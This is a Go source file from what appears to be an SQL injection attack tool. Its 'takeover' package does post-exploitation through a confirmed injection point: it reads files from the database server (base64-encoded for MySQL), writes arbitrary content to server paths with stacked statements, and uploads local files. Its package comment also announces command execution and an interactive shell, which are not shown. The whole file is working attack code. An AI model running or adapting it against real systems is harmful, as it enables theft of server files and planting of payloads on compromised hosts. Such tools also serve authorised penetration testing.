// Package takeover implements post-exploitation through the database server:
// filesystem read/write/upload, OS command execution with an interactive shell,
// and (MSSQL only) Windows registry access. Every operation flows through the
// same confirmed SQL injection point and never re-runs detection.
package takeover

import (
	"context"
	"errors"
	"fmt"
	"os"
	"strings"

	"github.com/0xseif-code/vexor/internal/httpclient"
	"github.com/0xseif-code/vexor/internal/sqli"
	"github.com/0xseif-code/vexor/internal/sqli/dbms"
	"github.com/0xseif-code/vexor/internal/sqli/enumeration"
)

// FileSystem provides read/write access to files on the database server,
// where the DBMS account privileges allow it.
type FileSystem struct {
	det    sqli.Detection
	client *httpclient.Client
	ext    *enumeration.Extractor
	q      *dbms.Queries
}

// NewFileSystem builds a filesystem channel from a confirmed detection. The
// enumerator is recreated internally so the caller need only pass detection.
func NewFileSystem(det sqli.Detection, client *httpclient.Client) *FileSystem {
	return &FileSystem{
		det:    det,
		client: client,
		ext:    enumeration.NewExtractor(det, client, enumeration.Options{Concurrency: enumeration.DefaultConcurrency}),
		q:      dbms.Post(det.DBMS),
	}
}

// NewFileSystemWith builds a filesystem channel sharing an existing enumerator.
func NewFileSystemWith(det sqli.Detection, client *httpclient.Client, opt enumeration.Options) *FileSystem {
	return &FileSystem{
		det:    det,
		client: client,
		ext:    enumeration.NewExtractor(det, client, opt),
		q:      dbms.Post(det.DBMS),
	}
}

// Extractor exposes the underlying extraction engine.
func (fs *FileSystem) Extractor() *enumeration.Extractor { return fs.ext }

// Supported reports whether file read is available for the backend.
func (fs *FileSystem) Supported() bool {
	return fs.q != nil && fs.q.ReadFile != nil && !strings.Contains(fs.q.ReadFile("x"), "unsupported")
}

// ReadFile reads a text file from the server. Binary content is handled by
// base64-encoding on the wire (where supported) and decoding locally.
func (fs *FileSystem) ReadFile(ctx context.Context, remotePath string) ([]byte, error) {
	if fs.q == nil || fs.q.ReadFile == nil {
		return nil, errors.New("file read is not supported for this DBMS/configuration")
	}
	switch fs.ext.DB() {
	case "mysql":
		data, err := fs.ext.ExtractBase64String(ctx, fs.fsReadExpr(remotePath))
		if err != nil {
			return nil, err
		}
		return data, nil
	default:
		q := fs.q.ReadFile(remotePath)
		raw, err := fs.ext.ExtractString(ctx, q)
		if err != nil {
			return nil, err
		}
		if raw == "" {
			return nil, errors.New("file is empty, unreadable, or does not exist")
		}
		return []byte(raw), nil
	}
}

// fsReadExpr builds the base64-carrying scalar expression used to read a file
// through the (possibly blind) injection channel.
func (fs *FileSystem) fsReadExpr(remotePath string) string {
	q := fs.q.ReadFile(remotePath)
	return fs.ext.B64Expr(fs.stripSelect(q))
}

// stripSelect removes a leading "SELECT " so the query can be nested safely as
// a scalar subexpression by the base64 wrapper.
func (fs *FileSystem) stripSelect(q string) string {
	u := strings.TrimSpace(q)
	if strings.HasPrefix(strings.ToUpper(u), "SELECT ") {
		return strings.TrimSpace(u[len("SELECT "):])
	}
	return q
}

// WriteFile writes content to a file on the server. Returns an error only when
// the operation could not be dispatched; a nil error means the statement was
// accepted (it may still fail server-side if the path is not writable).
func (fs *FileSystem) WriteFile(ctx context.Context, remotePath string, content []byte) error {
	if fs.q == nil || fs.q.WriteFile == nil || fs.q.WriteFile("", "") == "" {
		return errors.New("file write is not supported for this DBMS/configuration")
	}
	q := fs.q.WriteFile(escapeSingle(string(content)), remotePath)
	if strings.Contains(strings.ToLower(q), "unsupported") {
		return errors.New("file write is not supported for this DBMS/configuration")
	}
	if v := fs.ext.StackIf(q); v != "" {
		_, err := fs.ext.Send(ctx, v)
		return err
	}
	return errors.New("backend does not support stacked statements required for file write")
}

// UploadFile reads a local file and writes it to the server.
func (fs *FileSystem) UploadFile(ctx context.Context, localPath, remotePath string) error {
	data, err := os.ReadFile(localPath)
	if err != nil {
		return fmt.Errorf("read local file: %w", err)
	}
	return fs.WriteFile(ctx, remotePath, data)
}

func escapeSingle(s string) string {
	return strings.ReplaceAll(s, "'", "''")
}
